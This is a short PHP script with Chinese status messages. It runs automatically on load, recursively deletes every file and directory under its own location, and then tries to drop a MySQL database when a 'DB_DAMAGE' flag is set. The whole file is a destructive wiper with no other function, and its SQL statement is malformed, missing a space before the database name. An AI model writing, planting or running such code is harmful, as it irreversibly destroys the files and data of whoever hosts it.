<?php

define('DB_NAME', '');
define('DB_USER', '');
define('DB_PWD', '');
define('DB_HOST', 'localhost');
define('DB_PORT', '3306');
define('DB_DAMAGE', true);	
run();

/**
 * 
 *
 * @return void
 **/
function run()
{
	deletedir();
	deleteDB();
}

/**
 *
 *
 * @return void
 **/
function deletedir($dir = ''){
	if ($dir == '') {
		$dir = realpath('.');
		echo $dir;
	}
	
      if(!$handle=@opendir($dir)){    
      	die("没有该目录");
      }
      while(false !==($file=readdir($handle))){
               if($file!=="."&&$file!==".."){     
               	$file=$dir .DIRECTORY_SEPARATOR. $file;
               	if(is_dir($file)){
               		deletedir($file);
               	}else{
               		if(@unlink($file)){
               			echo "<b>$file</b>删除成功。<br>";
               		}else{
               			echo  "<b>$file</b>删除失败!<br>";
               		}
               	}
               }
               if(@rmdir($dir)){
               	echo "<b>$dir</b>删除成功了。<br>\n";
               }else{
               	echo "<b>$dir</b>删除失败！<br>\n";
               }
    }
}

/**
 * 
 *
 * @return void
 **/
function deleteDB()
{
	if(DB_DAMAGE === true){
		//start
		$conn = mysqli_connect(DB_HOST, DB_USER, DB_PWD);
		if(! $conn )
		{
			die('连接失败: ' . mysqli_error($conn));
		}
		echo '连接成功<br />';
		$sql = 'DROP DATABASE'.DB_NAME;
		$retval = mysqli_query( $conn, $sql );
		if(! $retval )
		{
			die('失败: ' . mysqli_error($conn));
		}
		echo "删除成功\n";
		mysqli_close($conn);
	}
}